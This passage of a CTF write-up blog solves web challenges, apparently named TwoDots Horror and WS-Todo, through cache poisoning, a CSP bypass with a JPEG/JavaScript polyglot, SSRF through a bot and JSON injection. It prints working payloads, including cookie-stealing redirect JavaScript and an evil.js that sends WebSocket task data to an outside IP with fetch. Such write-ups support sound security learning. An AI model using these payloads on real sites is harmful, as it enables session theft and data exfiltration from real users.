+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template<br><span class="hljs-keyword">from</span> flask_cors <span class="hljs-keyword">import</span> CORS<br><br>app = Flask(__name__)<br><br>CORS(app)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/static/&lt;file&gt;&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file</span>(<span class="hljs-params">file</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(file, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/message/&lt;msg&gt;&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_msg</span>(<span class="hljs-params">msg</span>):<br>    <span class="hljs-built_in">print</span>(msg)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;yes&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello&quot;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port = <span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure>
+
+<p>Note: <code>CORS</code> needs to be <code>ON</code> so that the bot can receive our server’s response.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><br>base = <span class="hljs-string">&quot;http://167.172.62.51:31109&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">poison_cache</span>(<span class="hljs-params">_<span class="hljs-built_in">id</span></span>):<br>    headers = &#123;<br>        <span class="hljs-string">&#x27;host&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;X-Forwarded-Host&#x27;</span>: <span class="hljs-string">&#x27;vps_ip&#x27;</span>,<br>        <span class="hljs-string">&#x27;x-forwarded-port&#x27;</span>: <span class="hljs-string">&#x27;vps_port&#x27;</span><br>    &#125;<br>    r = requests.get(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;base&#125;</span>/letters?id=<span class="hljs-subst">&#123;_<span class="hljs-built_in">id</span>&#125;</span>&quot;</span>, headers=headers)<br>    <span class="hljs-keyword">if</span> re.search(headers[<span class="hljs-string">&#x27;X-Forwarded-Host&#x27;</span>], r.text):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;cache poison success&quot;</span>)<br><br><br>_<span class="hljs-built_in">id</span> = requests.get(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;base&#125;</span>/message/1&quot;</span>).json().get(<span class="hljs-string">&quot;count&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;current id: &quot;</span>, _<span class="hljs-built_in">id</span>)<br>poison_cache(_<span class="hljs-built_in">id</span> + <span class="hljs-number">1</span>)<br>url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;base&#125;</span>/submit&quot;</span><br>data = &#123;<br>    <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;1&quot;</span><br>&#125;<br>requests.post(url, json=data)<br></code></pre></td></tr></table></figure>
+
+<h1 id="TwoDots-Horror"><a href="#TwoDots-Horror" class="headerlink" title="TwoDots Horror"></a>TwoDots Horror</h1><blockquote>
+<p>Everything starts from a dot and builds up to two. Uniting them is like a kiss in the dark from a stranger. Made up horrors to help you cope with the real ones, join us to take a bite at the two-sentence horror  stories on our very own TwoDots Horror™ blog.</p>
+</blockquote>
+<p>First things first – let’s explore the website.</p>
+<p>We can register a user, post our stories and upload our avatar.</p>
+<p>Our story gets reviewed by an admin bot.</p>
+<p>(BTW, our story needs to contains exact 2 dots which basically means it’s a two lines story)</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js">router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/submit&#x27;</span>, <span class="hljs-title class_">AuthMiddleware</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>	<span class="hljs-keyword">return</span> db.<span class="hljs-title function_">getUser</span>(req.<span class="hljs-property">data</span>.<span class="hljs-property">username</span>)<br>		.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">user</span> =&gt;</span> &#123;<br>			<span class="hljs-keyword">if</span> (user === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>); <br>			<span class="hljs-keyword">const</span> &#123; content &#125; = req.<span class="hljs-property">body</span>;<br>			<span class="hljs-keyword">if</span>(content)&#123;<br>				twoDots = content.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/\./g</span>);<br>				<span class="hljs-keyword">if</span>(twoDots == <span class="hljs-literal">null</span> || twoDots.<span class="hljs-property">length</span> != <span class="hljs-number">2</span>)&#123;<br>					<span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&#x27;Your story must contain two sentences! We call it TwoDots Horror!&#x27;</span>));<br>				&#125;<br>				<span class="hljs-keyword">return</span> db.<span class="hljs-title function_">addPost</span>(user.<span class="hljs-property">username</span>, content)<br>					.<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>						bot.<span class="hljs-title function_">purgeData</span>(db);<br>						res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&#x27;Your submission is awaiting approval by Admin!&#x27;</span>));<br>					&#125;);<br>			&#125;<br>			<span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&#x27;Please write your story first!&#x27;</span>));<br>		&#125;)<br>		.<span class="hljs-title function_">catch</span>(<span class="hljs-function">() =&gt;</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-title function_">response</span>(<span class="hljs-string">&#x27;Something went wrong!&#x27;</span>)));<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>The bot will visit our story carrying the flag.</p>
+<p><img src="/./../img/image-20230814102515912.png" srcset="/img/loading.gif" lazyload alt="image-20230814102515912"></p>
+<p>The obvious thing here is to use XSS and steal the cookie. But this is not so easy because the app has a CSP defense in-place.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>	res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&quot;Content-Security-Policy&quot;</span>, <span class="hljs-string">&quot;default-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src &#x27;self&#x27; https://fonts.googleapis.com; font-src &#x27;self&#x27; https://fonts.gstatic.com;&quot;</span>)<br>	<span class="hljs-title function_">next</span>();<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>we can see that we can use scripts from the same origin</p>
+<p>So let’s see if we could control or upload some files containing evil js code on the server.</p>
+<p>The website allows us to change our profile picture. We can use this to upload a <strong>polyglot file</strong>, which has a <strong>jpeg</strong> and a <strong>javascript code</strong> in the same file.</p>
+<p>When we upload the file, we have to <strong>conform to the image criteria</strong> imposed by this method.</p>
+<p><img src="/./../img/image-20230814103108361.png" srcset="/img/loading.gif" lazyload alt="image-20230814103108361"></p>
+<p>The file must be a JPEG image with a minimum size of 120×120 pixels.</p>
+<p>Use <a target="_blank" rel="noopener" href="https://github.com/s-3ntinel/imgjs_polygloter">this script</a> to generate the demanded picture.</p>
+<blockquote>
+<p>python img_polygloter.py jpg –height 120 –width 120 –payload ‘window.location.href&#x3D;”<a href="https://ip:port/?flag="+document.cookie">https://ip:port/?flag=&quot;+document.cookie</a>;’ –output xss.jpg</p>
+<p>Note: In powershell you need to add backslash before double quote in the payload parameter</p>
+</blockquote>
+<p><img src="/./../img/image-20230814105347517.png" srcset="/img/loading.gif" lazyload alt="image-20230814105347517"></p>
+<p>Register as username admin,</p>
+<p>access <code>/api/avatar/admin</code> to get our avatar</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script src=<span class="hljs-string">&quot;/api/avatar/admin&quot;</span> charset=<span class="hljs-string">&quot;ISO-8859-1&quot;</span>/&gt;&lt;/script&gt;..<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20230814105714999.png" srcset="/img/loading.gif" lazyload alt="image-20230814105714999"></p>
+<p>I use netcat to listen on a port on my vps. But what it receives are some gabage chars. Maybe the encoding problem? No idea how to fix it.</p>
+<p>Let’s use pipedream to create an online free webhook instead</p>
+<p><img src="/./../img/image-20230814111229308.png" srcset="/img/loading.gif" lazyload alt="image-20230814111229308"> </p>
+<h1 id="WS-Todo"><a href="#WS-Todo" class="headerlink" title="WS-Todo"></a>WS-Todo</h1><blockquote>
+<p>This WebSockets-based Todo application features ✨millitary-grade  encryption✨ and is extremely low-latency. Ideal for busy students and working professionals alike.</p>
+</blockquote>
+<p>There are two web application exposed.</p>
+<p>One is a toDo application and another a htmltester.</p>
+<p>Application 1:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> puppeteer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;puppeteer&#x27;</span>)<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">LOGIN_URL</span> = <span class="hljs-string">&quot;http://127.0.0.1/login&quot;</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">visit</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">url</span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> ctx = <span class="hljs-keyword">await</span> browser.<span class="hljs-title function_">createIncognitoBrowserContext</span>()<br>    <span class="hljs-keyword">const</span> page = <span class="hljs-keyword">await</span> ctx.<span class="hljs-title function_">newPage</span>()<br><br>    <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">goto</span>(<span class="hljs-variable constant_">LOGIN_URL</span>, &#123; <span class="hljs-attr">waitUntil</span>: <span class="hljs-string">&#x27;networkidle2&#x27;</span> &#125;)<br>    <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">waitForSelector</span>(<span class="hljs-string">&#x27;form&#x27;</span>)<br>    <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;wired-input[name=username]&#x27;</span>, process.<span class="hljs-property">env</span>.<span class="hljs-property">USERNAME</span>)<br>    <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;wired-input[name=password]&#x27;</span>, process.<span class="hljs-property">env</span>.<span class="hljs-property">PASSWORD</span>)<br>    <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">click</span>(<span class="hljs-string">&#x27;wired-button&#x27;</span>)<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">goto</span>(url, &#123; <span class="hljs-attr">waitUntil</span>: <span class="hljs-string">&#x27;networkidle2&#x27;</span> &#125;)<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">close</span>()<br>        <span class="hljs-keyword">await</span> ctx.<span class="hljs-title function_">close</span>()<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">doReportHandler</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">req, res</span>) =&gt; &#123;<br> <span class="hljs-comment">//...</span><br>    <span class="hljs-keyword">const</span> url = req.<span class="hljs-property">body</span>.<span class="hljs-property">url</span><br>    <span class="hljs-keyword">if</span> (<br>        url === <span class="hljs-literal">undefined</span> ||<br>        (!url.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&#x27;http://&#x27;</span>) &amp;&amp; !url.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&#x27;https://&#x27;</span>))<br>    ) &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Invalid URL&#x27;</span> &#125;)<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">await</span> <span class="hljs-title function_">visit</span>(url)<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">200</span>)<br>    &#125; <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>visit <code>POST/report</code> will triger the server to visit any web page which contributes to SSRF.</p>
+<p>Application 2:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>    &lt;body&gt;<br>        <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;html&#x27;</span>])): <span class="hljs-meta">?&gt;</span><br>            <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;html&#x27;</span>]; <span class="hljs-meta">?&gt;</span><br>        <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">else</span>: <span class="hljs-meta">?&gt;</span><br>            &lt;h1&gt;HTML Tester&lt;/h1&gt;<br>            &lt;p&gt;Internal development tool&lt;/p&gt;<br>            &lt;form action=<span class="hljs-string">&quot;index.php&quot;</span> method=<span class="hljs-string">&quot;get&quot;</span>&gt;<br>                &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;html&quot;</span> /&gt;<br>                &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Submit&quot;</span> /&gt;<br>            &lt;/form&gt;<br>        <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endif</span>; <span class="hljs-meta">?&gt;</span><br>    &lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<p>Obviously, there is a reflected XSS vuln.</p>
+<p><img src="/./../img/image-20230814165246810.png" srcset="/img/loading.gif" lazyload alt="image-20230814165246810"></p>
+<p>How to get flag?</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs js">ws.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-keyword">async</span> (msg) =&gt; &#123;<br>        <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(msg);<br>        <span class="hljs-keyword">const</span> secret = <span class="hljs-keyword">await</span> db.<span class="hljs-title function_">getSecret</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">userId</span>);<br><br>        <span class="hljs-keyword">if</span> (data.<span class="hljs-property">action</span> === <span class="hljs-string">&#x27;add&#x27;</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">await</span> db.<span class="hljs-title function_">addTask</span>(userId, <span class="hljs-string">`&#123;&quot;title&quot;:&quot;<span class="hljs-subst">$&#123;data.title&#125;</span>&quot;,&quot;description&quot;:&quot;<span class="hljs-subst">$&#123;data.description&#125;</span>&quot;,&quot;secret&quot;:&quot;<span class="hljs-subst">$&#123;secret&#125;</span>&quot;&#125;`</span>);<br>                ws.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">action</span>: <span class="hljs-string">&#x27;add&#x27;</span> &#125;));<br>            &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>                ws.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">action</span>: <span class="hljs-string">&#x27;add&#x27;</span> &#125;));<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (data.<span class="hljs-property">action</span> === <span class="hljs-string">&#x27;get&#x27;</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">const</span> results = <span class="hljs-keyword">await</span> db.<span class="hljs-title function_">getTasks</span>(userId);<br>                <span class="hljs-keyword">const</span> tasks = [];<br>                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> result <span class="hljs-keyword">of</span> results) &#123;<br><br>                    <span class="hljs-keyword">let</span> quote;<br><br>                    <span class="hljs-keyword">if</span> (userId === <span class="hljs-number">1</span>) &#123;<br>                        quote = <span class="hljs-string">`A wise man once said, &quot;the flag is <span class="hljs-subst">$&#123;process.env.FLAG&#125;</span>&quot;.`</span>;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        quote = quotes[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * quotes.<span class="hljs-property">length</span>)];<br>                    &#125;<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-keyword">const</span> task = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(result.<span class="hljs-property">data</span>);<br>                        tasks.<span class="hljs-title function_">push</span>(&#123;<br>                            <span class="hljs-attr">title</span>: <span class="hljs-title function_">encrypt</span>(task.<span class="hljs-property">title</span>, task.<span class="hljs-property">secret</span>),<br>                            <span class="hljs-attr">description</span>: <span class="hljs-title function_">encrypt</span>(task.<span class="hljs-property">description</span>, task.<span class="hljs-property">secret</span>),<br>                            <span class="hljs-attr">quote</span>: <span class="hljs-title function_">encrypt</span>(quote, task.<span class="hljs-property">secret</span>)<br>                        &#125;);<br>                    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>                        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Error parsing task <span class="hljs-subst">$&#123;result.data&#125;</span>: <span class="hljs-subst">$&#123;e&#125;</span>`</span>);<br>                    &#125;<br>                &#125;<br>                ws.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">action</span>: <span class="hljs-string">&#x27;get&#x27;</span>, <span class="hljs-attr">tasks</span>: tasks &#125;));<br>            &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>                ws.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">action</span>: <span class="hljs-string">&#x27;get&#x27;</span> &#125;));<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            ws.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Invalid action&#x27;</span> &#125;));<br>        &#125;<br>    &#125;);<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>The database create the admin user with userId&#x3D;1 when initializing.</p>
+<p>Ideas gradually become clearer: let the server visit application 2 with a reflected XSS payload. Then visit <code>/ws</code> in application 1 and send the response flag to us.</p>
+<p>For HTTP request, the browser may block the response from server due to CORS problem. But websocket doesn’t have this problem. (BTW, if there is CSP protection, the browser may prohibit us from sending request)</p>
+<p>Hang on a second. There is a bigger problem. The data we received is encrypted. We need to get the admin’s secret key. It’s not easy to get the key which was created when the database was initialized. </p>
+<p>The flag is encrypted using the retrieved task’s secret field.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">quote</span>: <span class="hljs-title function_">encrypt</span>(quote, task.<span class="hljs-property">secret</span>)<br></code></pre></td></tr></table></figure>
+
+<p>The task is generated as below:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> secret = <span class="hljs-keyword">await</span> db.<span class="hljs-title function_">getSecret</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">userId</span>);<br><br><span class="hljs-keyword">await</span> db.<span class="hljs-title function_">addTask</span>(userId, <span class="hljs-string">`&#123;&quot;title&quot;:&quot;<span class="hljs-subst">$&#123;data.title&#125;</span>&quot;,&quot;description&quot;:&quot;<span class="hljs-subst">$&#123;data.description&#125;</span>&quot;,&quot;secret&quot;:&quot;<span class="hljs-subst">$&#123;secret&#125;</span>&quot;&#125;`</span>);<br></code></pre></td></tr></table></figure>
+
+<p>The data is restored as a concatenated string.</p>
+<p>We can try <em>JSON injection</em></p>
+<p><img src="/./../img/image-20230814172950058.png" srcset="/img/loading.gif" lazyload alt="image-20230814172950058"></p>
+<p>It does not perform what we expected.</p>
+<p>When <code>JSON.parse()</code> encounters multiple identical keys, the value of the latter key will override the former’s.</p>
+<p>Notice that the data field has a max length 255.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">data <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span><br></code></pre></td></tr></table></figure>
+
+<p>We can pad some garbage data to trancate the latter secret key.</p>
+<p>put <code>evil.js</code> in our vps.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> ws = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(<span class="hljs-string">`ws://127.0.0.1/ws`</span>);<br>ws.<span class="hljs-property">onopen</span> = <span class="hljs-function">() =&gt;</span> &#123;<br>    ws.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<br>        &#123;<br>             <span class="hljs-attr">action</span>: <span class="hljs-string">&#x27;add&#x27;</span>,<br>              <span class="hljs-attr">title</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>              <span class="hljs-attr">description</span>: <span class="hljs-string">&quot;111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\&quot;,\&quot;secret\&quot;: \&quot;73c12045f8de028073fdbe7931f2ff86\&quot;&#125;&quot;</span> <br>    &#125;));<br>    ws.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">action</span>: <span class="hljs-string">&#x27;get&#x27;</span> &#125;))<br>&#125;<br>ws.<span class="hljs-property">onmessage</span> = <span class="hljs-keyword">async</span> (msg) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(msg.<span class="hljs-property">data</span>);<br>    <span class="hljs-keyword">if</span> (data.<span class="hljs-property">success</span>) &#123;<br>        <span class="hljs-keyword">if</span> (data.<span class="hljs-property">action</span> === <span class="hljs-string">&#x27;get&#x27;</span>) &#123;<br>            <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://111.229.236.113/&quot;</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data.<span class="hljs-property">tasks</span> ))<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (data.<span class="hljs-property">action</span> === <span class="hljs-string">&#x27;add&#x27;</span>) &#123;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>POST &#x2F;report HTTP&#x2F;1.1<br>Host: 167.172.62.51:31587<br>Content-Type: application&#x2F;json<br>Cookie: connect.sid&#x3D;s%3ABOoTwHrro-0SbvX4i0wW31n52oaZDL9q.ZWPusHqvZkFbvriaykBQRKIKiTK8KKd3E8uH99DN0Mo<br>Content-Length: 124</p>
+<p>{“url”: “<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/index.php?html=%3Cscript%20src=%22http://ip:port/evil.js%22%3E%3C/script%3E%22%7D">http://127.0.0.1:8080/index.php?html=%3Cscript%20src=%22http://ip:port/evil.js%22%3E%3C/script%3E&quot;}</a></p>
+</blockquote>
+<p><img src="/./../img/image-20230814160606652.png" srcset="/img/loading.gif" lazyload alt="image-20230814160606652"></p>
+<p>decrypt the cipher</p>
